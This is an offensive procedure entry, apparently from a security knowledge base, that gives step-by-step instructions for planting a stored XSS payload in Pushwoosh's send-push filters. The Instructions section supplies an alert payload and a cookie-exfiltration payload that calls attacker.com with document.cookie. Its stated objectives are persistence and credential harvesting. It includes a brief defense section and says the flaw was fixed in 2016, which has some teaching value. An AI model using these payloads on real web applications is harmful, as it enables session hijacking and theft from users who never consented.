---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - xss
  - stored-xss
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:14.466Z'
skill_level: novice
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload-in-Pushwoosh-Filters

## Summary

This procedure exploits a lack of input sanitization in the Pushwoosh send push form's filters section to inject a stored XSS payload, which persists on the server and executes JavaScript when the form is loaded by other users.

## Description

In the Pushwoosh platform, the filters feature in the send push form allows users to define targeting criteria. Due to inadequate escaping, attackers can submit HTML/JavaScript payloads that are stored and rendered without sanitization when the form is accessed. This leads to arbitrary code execution in the victim's browser, potentially enabling session theft or phishing. The vulnerability was reported in 2016 and fixed promptly, but the technique illustrates classic stored XSS risks in web applications handling user input.

## Requirements

1. Valid Pushwoosh account credentials for dashboard access
2. Web browser with developer tools enabled for payload testing
3. Network connectivity to the Pushwoosh control panel (https://cp.pushwoosh.com)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., using libraries like DOMPurify) for all user inputs in forms
- Employ Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous JavaScript alerts or network requests from the dashboard

## Objectives

1. Persist malicious JavaScript in the application's database via the filters input
2. Set up for execution when legitimate users access the affected form
3. Demonstrate potential for broader attacks like credential harvesting

## Instructions

### Step 1: Access the Send Push Form

**Context**: Log into the Pushwoosh dashboard and navigate to the push notification creation interface to reach the vulnerable filters section.

Go to https://cp.pushwoosh.com and select "Send Push" from the menu.

### Step 2: Craft and Inject the Payload

**Context**: Enter a malicious script in the filters field, which is not sanitized, allowing storage of executable code.

In the filters input, enter: `<script>alert(document.domain);</script>` or a more advanced payload like `<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>` to exfiltrate data.

Submit the form to save the filter configuration.

> The payload is now stored server-side and will render as HTML when the form loads.

### Step 3: Verify Storage

**Context**: Confirm the payload is persisted by reviewing the filters or creating a test push.

Reload the send push form and inspect the filters section; the script tag should appear in the HTML source without encoding.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- stored-xss
- pushwoosh
- web-exploit
